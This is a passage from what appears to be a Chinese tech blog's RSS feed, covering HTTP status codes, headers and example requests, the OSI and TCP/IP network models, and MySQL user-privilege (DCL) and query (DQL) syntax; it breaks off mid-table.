&lt;ul>
&lt;li>200 OK：请求成功&lt;/li>
&lt;li>301 Moved Permanently：永久重定向&lt;/li>
&lt;li>302 Found：临时重定向&lt;/li>
&lt;li>400 Bad Request：客户端请求语法错误&lt;/li>
&lt;li>401 Unauthorized：请求需要用户认证&lt;/li>
&lt;li>403 Forbidden：服务器拒绝请求&lt;/li>
&lt;li>404 Not Found：请求的资源不存在&lt;/li>
&lt;li>500 Internal Server Error：服务器内部错误&lt;/li>
&lt;li>503 Service Unavailable：服务器暂时无法处理请求&lt;/li>
&lt;/ul>
&lt;h3 id="3-常见响应头字段">3. 常见响应头字段
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>字段名&lt;/th>
&lt;th>说明&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Server&lt;/td>
&lt;td>服务器软件信息&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-Type&lt;/td>
&lt;td>响应体的MIME类型&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-Length&lt;/td>
&lt;td>响应体的长度&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-Encoding&lt;/td>
&lt;td>响应体的编码方式&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Cache-Control&lt;/td>
&lt;td>缓存控制&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Set-Cookie&lt;/td>
&lt;td>设置Cookie&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Location&lt;/td>
&lt;td>重定向的目标URL&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Access-Control-Allow-Origin&lt;/td>
&lt;td>CORS跨域允许的来源&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="完整示例">完整示例
&lt;/h2>&lt;h3 id="get请求示例">GET请求示例
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">/api/users&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">api.example.com&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">application/json&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个GET请求示例说明：&lt;/p>
&lt;ul>
&lt;li>使用GET方法请求/api/users接口&lt;/li>
&lt;li>请求发送到api.example.com服务器&lt;/li>
&lt;li>使用Mozilla/5.0浏览器发送请求&lt;/li>
&lt;li>期望接收JSON格式的响应&lt;/li>
&lt;/ul>
&lt;h3 id="post请求示例">POST请求示例
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/api/users&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">api.example.com&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">application/json&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Length&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">57&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;username&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;john_doe&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;email&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;john@example.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个POST请求示例说明：&lt;/p>
&lt;ul>
&lt;li>使用POST方法向/api/users接口提交数据&lt;/li>
&lt;li>发送JSON格式的数据&lt;/li>
&lt;li>请求体包含用户名和邮箱信息&lt;/li>
&lt;li>Content-Length指明了请求体的长度&lt;/li>
&lt;/ul>
&lt;h3 id="响应示例">响应示例
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span> &lt;span class="m">200&lt;/span> &lt;span class="ne">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">application/json&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Length&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">234&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;status&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;success&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;data&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;id&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;username&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;john_doe&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;email&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;john@example.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个响应示例说明：&lt;/p>
&lt;ul>
&lt;li>请求处理成功（状态码200）&lt;/li>
&lt;li>返回JSON格式的数据&lt;/li>
&lt;li>响应体包含状态信息和用户数据&lt;/li>
&lt;li>服务器成功创建了用户并返回了用户ID&lt;/li>
&lt;/ul>
&lt;h3 id="multipartform-data示例文件上传">multipart/form-data示例（文件上传）
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="err">------WebKitFormBoundary7MA4YWxkTrZu0gW # 分隔边界线，用于分隔不同的表单项
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Content-Disposition: form-data; name=&amp;#34;username&amp;#34; # 第一个表单项：普通文本字段
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">张三 # 字段值
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">------WebKitFormBoundary7MA4YWxkTrZu0gW # 分隔边界线
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Content-Disposition: form-data; name=&amp;#34;photo&amp;#34;; filename=&amp;#34;profile.jpg&amp;#34; # 第二个表单项：文件上传
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Content-Type: image/jpeg # 上传文件的MIME类型
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">[二进制文件内容] # 实际的文件内容
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">------WebKitFormBoundary7MA4YWxkTrZu0gW-- # 结束边界线（注意末尾有--）
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="applicationx-www-form-urlencoded示例">application/x-www-form-urlencoded示例
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="err">POST /login HTTP/1.1 # 请求行：POST方法，用于登录
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Host: example.com # 请求的目标主机名
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Content-Type: application/x-www-form-urlencoded # 内容类型为表单数据
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Content-Length: 38 # 请求体长度
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">username=张三&amp;amp;password=123456&amp;amp;remember=true # 请求体：键值对格式，使用&amp;amp;分隔
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="带cookie的请求示例">带Cookie的请求示例
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="err">GET /api/profile HTTP/1.1 # 请求行：GET方法，获取用户资料
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Host: api.example.com # 请求的目标主机名
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Cookie: sessionId=abc123; userId=789 # Cookie信息，包含会话ID和用户ID
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Accept: application/json # 期望接收JSON格式的响应
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="重定向响应示例">重定向响应示例
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span> &lt;span class="m">302&lt;/span> &lt;span class="ne">Found # 状态行：302表示临时重定向&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Location&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">https://new.example.com/page # 重定向的目标URL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cache-Control&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">no-cache # 缓存控制：不使用缓存&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Set-Cookie&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">session=def456; Path=/ # 设置新的Cookie&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>OSI七层模型和TCP/IP 五层模型</title><link>https://souljian.cn/p/746087185/</link><pubDate>Thu, 01 May 2025 16:13:05 +0800</pubDate><guid>https://souljian.cn/p/746087185/</guid><description>&lt;h2 id="osi七层模型">OSI七层模型
&lt;/h2>&lt;p>OSI（Open Systems Interconnection）模型是国际标准化组织（ISO）定义的一个概念模型，将计算机网络体系结构分为七层。从上到下分别是：&lt;/p>
&lt;h3 id="7-应用层application-layer">7. 应用层（Application Layer）
&lt;/h3>&lt;ul>
&lt;li>功能：为应用程序提供网络服务&lt;/li>
&lt;li>协议：HTTP、FTP、SMTP、DNS等&lt;/li>
&lt;li>数据单位：数据（Data）&lt;/li>
&lt;/ul>
&lt;h3 id="6-表示层presentation-layer">6. 表示层（Presentation Layer）
&lt;/h3>&lt;ul>
&lt;li>功能：数据格式转换、加密解密、压缩解压缩&lt;/li>
&lt;li>处理：字符编码、数据加密、压缩等&lt;/li>
&lt;li>数据单位：数据（Data）&lt;/li>
&lt;/ul>
&lt;h3 id="5-会话层session-layer">5. 会话层（Session Layer）
&lt;/h3>&lt;ul>
&lt;li>功能：建立、管理和终止会话&lt;/li>
&lt;li>处理：会话协调、同步&lt;/li>
&lt;li>数据单位：数据（Data）&lt;/li>
&lt;/ul>
&lt;h3 id="4-传输层transport-layer">4. 传输层（Transport Layer）
&lt;/h3>&lt;ul>
&lt;li>功能：端到端的可靠数据传输&lt;/li>
&lt;li>协议：TCP、UDP&lt;/li>
&lt;li>数据单位：段（Segment）&lt;/li>
&lt;/ul>
&lt;h3 id="3-网络层network-layer">3. 网络层（Network Layer）
&lt;/h3>&lt;ul>
&lt;li>功能：路由选择和逻辑寻址&lt;/li>
&lt;li>协议：IP、ICMP、IGMP&lt;/li>
&lt;li>数据单位：包（Packet）&lt;/li>
&lt;/ul>
&lt;h3 id="2-数据链路层data-link-layer">2. 数据链路层（Data Link Layer）
&lt;/h3>&lt;ul>
&lt;li>功能：物理寻址，错误侦测与修正&lt;/li>
&lt;li>协议：以太网、PPP&lt;/li>
&lt;li>数据单位：帧（Frame）&lt;/li>
&lt;/ul>
&lt;h3 id="1-物理层physical-layer">1. 物理层（Physical Layer）
&lt;/h3>&lt;ul>
&lt;li>功能：比特流的传输&lt;/li>
&lt;li>设备：网线、集线器等&lt;/li>
&lt;li>数据单位：比特（Bit）&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="tcpip五层模型">TCP/IP五层模型
&lt;/h2>&lt;p>TCP/IP模型是实际互联网的实现标准，它将OSI模型简化为五层：&lt;/p>
&lt;h3 id="5-应用层">5. 应用层
&lt;/h3>&lt;ul>
&lt;li>对应OSI的应用层、表示层和会话层&lt;/li>
&lt;li>主要协议：HTTP、FTP、SMTP、DNS等&lt;/li>
&lt;/ul>
&lt;h3 id="4-传输层">4. 传输层
&lt;/h3>&lt;ul>
&lt;li>与OSI的传输层对应&lt;/li>
&lt;li>主要协议：TCP（可靠传输）、UDP（不可靠传输）&lt;/li>
&lt;/ul>
&lt;h3 id="3-网络层">3. 网络层
&lt;/h3>&lt;ul>
&lt;li>与OSI的网络层对应&lt;/li>
&lt;li>主要协议：IP、ICMP、IGMP&lt;/li>
&lt;/ul>
&lt;h3 id="2-数据链路层">2. 数据链路层
&lt;/h3>&lt;ul>
&lt;li>与OSI的数据链路层对应&lt;/li>
&lt;li>处理物理地址和错误检测&lt;/li>
&lt;/ul>
&lt;h3 id="1-物理层">1. 物理层
&lt;/h3>&lt;ul>
&lt;li>与OSI的物理层对应&lt;/li>
&lt;li>处理比特流的传输&lt;/li>
&lt;/ul>
&lt;h2 id="两种模型的对比">两种模型的对比
&lt;/h2>&lt;h3 id="相同点">相同点
&lt;/h3>&lt;ol>
&lt;li>都采用了分层的结构&lt;/li>
&lt;li>都是为了解决异构网络互联问题&lt;/li>
&lt;li>都遵循协议独立的原则&lt;/li>
&lt;/ol>
&lt;h3 id="不同点">不同点
&lt;/h3>&lt;ol>
&lt;li>OSI是理论上的模型，TCP/IP是实际应用的模型&lt;/li>
&lt;li>OSI分为七层，TCP/IP合并了一些功能层，简化为五层&lt;/li>
&lt;li>TCP/IP模型更加灵活和实用，是实际互联网的基础&lt;/li>
&lt;/ol>
&lt;h2 id="总结">总结
&lt;/h2>&lt;p>虽然OSI模型在理论上更为完整，但TCP/IP模型因其简洁性和实用性成为了实际互联网的标准。理解这两个模型对于网络工程师和开发人员来说都是非常重要的基础知识。在实际应用中，我们主要使用TCP/IP模型，但OSI模型提供的概念框架仍然具有重要的参考价值。&lt;/p></description></item><item><title>Mysql DCL语句使用</title><link>https://souljian.cn/p/746026995/</link><pubDate>Wed, 30 Apr 2025 23:29:55 +0800</pubDate><guid>https://souljian.cn/p/746026995/</guid><description>&lt;h3 id="dcl语句数据控制语言用来创建数据库用户控制数据库的访问权限">DCL语句(数据控制语言，用来创建数据库用户，控制数据库的访问权限)
&lt;/h3>&lt;h4 id="用户管理">用户管理
&lt;/h4>&lt;ol>
&lt;li>
&lt;p>查询用户&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>use mysql;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>select * from user;&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>创建用户&lt;/p>
&lt;ul>
&lt;li>&lt;code>create user '用户名'@'主机名' identified by '密码';&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>修改用户密码&lt;/p>
&lt;ul>
&lt;li>&lt;code>alter user '用户名''@主机名' identified with mysql_native_password by '新密码';&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>删除用户&lt;/p>
&lt;ul>
&lt;li>&lt;code>drop user '用户名'@'主机名';&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>注意&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>主机名可以使用通配符(%)&lt;/li>
&lt;li>DCL语句一般用语数据库管理人员使用&lt;/li>
&lt;/ul>
&lt;h4 id="权限说明">权限说明
&lt;/h4>&lt;ul>
&lt;li>Mysql中定义了很多种权限,但常用的就以下几种:
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>权限&lt;/th>
&lt;th>说明&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>ALL&lt;/code> / &lt;code>ALL PRIVILEGES&lt;/code>&lt;/td>
&lt;td>所有权限&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>SELECT&lt;/code>&lt;/td>
&lt;td>查询数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>INSERT&lt;/code>&lt;/td>
&lt;td>插入数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>UPDATE&lt;/code>&lt;/td>
&lt;td>修改数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>DELETE&lt;/code>&lt;/td>
&lt;td>删除数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>ALTER&lt;/code>&lt;/td>
&lt;td>修改表结构&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>DROP&lt;/code>&lt;/td>
&lt;td>删除数据库/表/视图&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>CREATE&lt;/code>&lt;/td>
&lt;td>创建数据库/表&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;h4 id="权限控制">权限控制
&lt;/h4>&lt;ol>
&lt;li>查询权限
&lt;ul>
&lt;li>&lt;code>show grants for '用户名'@'ip白名单'&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>授予权限
&lt;ul>
&lt;li>&lt;code>grant 权限列表 on 数据库名.表名 to '用户名'@'ip白名单'&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>撤销权限
&lt;ul>
&lt;li>&lt;code>revoke 权限列表 on 数据库名.表名 from '用户名'@'ip白名单'&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>注意&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>多个权限之间,使用逗号分开&lt;/li>
&lt;li>授权时,数据库名和表名可以是用通配符*,代表所有&lt;/li>
&lt;/ul></description></item><item><title>Mysql DQL语句使用</title><link>https://souljian.cn/p/746023289/</link><pubDate>Wed, 30 Apr 2025 22:28:09 +0800</pubDate><guid>https://souljian.cn/p/746023289/</guid><description>&lt;h2 id="dql语句数据查询语言用来查询数据库中表的数据">DQL语句(数据查询语言，用来查询数据库中表的数据)
&lt;/h2>&lt;h3 id="基本语法">基本语法
&lt;/h3>&lt;pre>&lt;code>- select 字段列表
- from 表名列表
- where 条件列表
- group by 分组字段列表
- having 分组后条件列表
- ordey by 排序字段列表
- limit 翻页参数
&lt;/code>&lt;/pre>
&lt;h3 id="基本查询">基本查询
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>查询字段&lt;/p>
&lt;ul>
&lt;li>查询多个字段&lt;code>select 字段1,字段2,字段3...from 表名&lt;/code>&lt;/li>
&lt;li>查询所有字段&lt;code>select * from 表名&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>设置别名&lt;code>select 字段[as 别名1],[as 别名2]...from表名&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>去除重复记录&lt;code>select distinct 字段列表 from 表名&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="条件查询">条件查询
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>&lt;strong>语法&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;code>select 字段列表 from 表名 where 条件列表;&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>条件&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>比较运算符&lt;/th>
&lt;th>功能&lt;/th>
&lt;th>逻辑运算符&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>&amp;gt;&lt;/code>&lt;/td>
&lt;td>大于&lt;/td>
&lt;td>&lt;code>AND&lt;/code> 或 &lt;code>&amp;amp;&amp;amp;&lt;/code>&lt;/td>
&lt;td>并且（多个条件同时成立）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;gt;=&lt;/code>&lt;/td>
&lt;td>大于等于&lt;/td>
&lt;td>&lt;code>OR&lt;/code> 或 &lt;code>||&lt;/code>&lt;/td>
&lt;td>或者（多个条件任意一个成立）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;lt;&lt;/code>&lt;/td>
&lt;td>小于&lt;/td>
&lt;td>&lt;code>NOT&lt;/code> 或 &lt;code>!&lt;/code>&lt;/td>
&lt;td>非，不是&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;lt;=&lt;/code>&lt;/td>
&lt;td>小于等于&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>=&lt;/code>&lt;/td>
&lt;td>等于&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;lt;&amp;gt;&lt;/code> 或 &lt;code>!=&lt;/code>&lt;/td>
&lt;td>不等于&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>BETWEEN … AND …&lt;/code>&lt;/td>
&lt;td>在某个范围之内（含最小、最大值）&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>IN(…)&lt;/code>&lt;/td>
&lt;td>在 in 之后的列表中的值（多选一）&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>LIKE&lt;/code>&lt;/td>
&lt;td>模糊匹配（&lt;code>_&lt;/code>匹配单个字符，&lt;code>%&lt;/code>匹配任意字符）&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>IS NULL&lt;/code>&lt;/td>
&lt;td>是 NULL&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="聚合函数">聚合函数
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>&lt;strong>介绍&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>将一列数据为一个整体,进行纵向计算&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>常见的聚合函数&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;table>
&lt;thead>
